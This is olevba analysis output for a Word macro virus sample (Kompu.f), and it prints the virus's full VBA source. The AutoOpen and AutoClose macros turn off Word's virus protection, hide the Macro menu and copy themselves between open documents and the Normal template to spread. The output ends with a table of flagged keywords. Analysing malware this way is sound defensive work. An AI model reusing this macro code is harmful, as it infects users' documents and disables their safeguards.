olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kompu.f-ab9f77bb8f049c23e2748546c4aa1dd62999176b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kompu.f-ab9f77bb8f049c23e2748546c4aa1dd62999176b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Kompu.f-ab9f77bb8f049c23e2748546c4aa1dd62999176b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
'AutoOpen
On Error Resume Next
WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoOpen") + ":AutoOpen", "Global:AutoOpen"
WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoClose") + ":AutoClose", "Global:AutoClose"
WordBasic.FileSaveAll 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Kompu.f-ab9f77bb8f049c23e2748546c4aa1dd62999176b - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()

On Error Resume Next


Options.VirusProtection = False
CommandBars("Tools").Controls("Macro").Delete


Dim modulo(6) As String
Dim n As Integer

Version = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Version", Default:="2")

If Version <= 2 Then

SaveSetting appname:="Aleja5", Section:="Inicio", _
                Key:="Version", setting:=2



n = 6
modulo(1) = "AutoClose"
modulo(2) = "AutoOpen"
modulo(3) = "ArchivoGuardar"
modulo(4) = "ArchivoGuardarComo"
modulo(5) = "ArchivoImprimir"
modulo(6) = "ArchivoImprimirPredeter"



For m = 1 To n

existe = False

For Each VBComponent In NormalTemplate.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
            Destination:=NormalTemplate.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

existe = False

For Each VBComponent In ActiveDocument.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
            Destination:=ActiveDocument.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

Next

End If

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

